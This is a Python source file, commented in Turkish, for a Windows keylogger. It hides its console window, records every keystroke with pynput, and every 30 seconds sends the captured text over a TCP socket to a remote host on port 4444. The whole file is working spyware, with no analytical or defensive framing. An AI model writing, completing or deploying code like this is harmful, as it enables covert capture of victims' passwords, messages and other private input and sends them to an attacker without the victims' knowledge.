# -*- coding: utf-8 -*-

from pynput.keyboard import Listener, Key
import threading
import socket
import win32console
import win32gui


class KeyLogger:
	host = ""  # gönderilecek ip adresi
	port = 4444  # gönderilecek port numarası
	sendTime = 30  # kaç saniyede bir gönderileceği

	log = ""
	special_keys_remove = [  # kaydı tutulmayacak özel karakterler
		Key.alt, Key.alt_l, Key.alt_r, Key.cmd, Key.ctrl, Key.ctrl_l, Key.ctrl_r, Key.alt_gr,
		Key.esc, Key.f1, Key.f2, Key.f3, Key.f4, Key.f5, Key.f6, Key.f7, Key.f8, Key.f9, Key.f10, Key.f11, Key.f12, Key.num_lock,
		Key.insert, Key.page_up, Key.page_down, Key.scroll_lock, Key.media_next, Key.media_play_pause, Key.media_previous,  Key.print_screen,
		Key.media_volume_down, Key.media_volume_up, Key.media_volume_mute, Key.menu, Key.pause, Key.shift, Key.shift_l, Key.shift_r
	]

	# kaydı tutulacak özel karakterler
	special_keys_write = [ Key.backspace, Key.caps_lock, Key.delete, Key.tab, Key.end, Key.home, Key.left, Key.right, Key.down, Key.up, Key.enter ]

	client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	

	def __init__(self):  # yapıcı fonksiyon
		try:  # bağlantıyı oluştur
			self.client.connect((self.host, self.port))
		except:
			exit()
		
		# bağlantının kurulduğunu gösteren mesaj
		self.client.send("- Bağlantı kuruldu.\n".encode("utf-8"))
		
		self.send_func()
		
		# klavye dinleyicisini aktif hale getir
		with Listener(on_press = self.on_press) as listener:
			listener.join()
	

	# bir tuşa basıldığında çalışacak fonksiyon
	def on_press(self, key):
		strkey = str(key)

		try:
			if (strkey == "'''"):  # "'" işareti yazıldı
				self.log += "'"
			elif (strkey == "'\\\\'"):  # \ karakteri
				self.log += "\\"
			elif (key == Key.space):  # space'e basıldı
				self.log += " "
			elif (key in self.special_keys_remove):  # kaydı tutulmayacak özel karakterler
				self.log += ""
			elif (key in self.special_keys_write):  # kaydı tutulacak özel karakterler
				self.log += f"[{strkey}]"
			elif ((len(strkey) in [4, 5]) and (96 <= int(strkey.replace("<", "").replace(">", "")) <= 105)):  # num 0-9 karakterleri
				self.log += str(int(strkey.replace("<", "").replace(">", "")) - 96)
			elif (strkey == "<110>"):  # num , karakteri
				self.log += ","
			else:  # tırnak işaretlerini kaldır
				self.log += strkey.replace("'", "")
		except:
			pass
	

	def send_func(self):  # not edilen karakterleri ilet
		try:
			self.client.send(self.log.encode('utf-8'))
			self.client.send(("\n"+"-"*50 + "\n").encode("utf-8"))
		except:
			self.client.close()
			exit()
		self.log = ""
		timer = threading.Timer(self.sendTime, self.send_func)
		timer.start()


def hideConsole():  # konsolu gizle
    win = win32console.GetConsoleWindow()
    win32gui.ShowWindow(win, 0)


# konsolu gizle
hideConsole()


logger = KeyLogger()
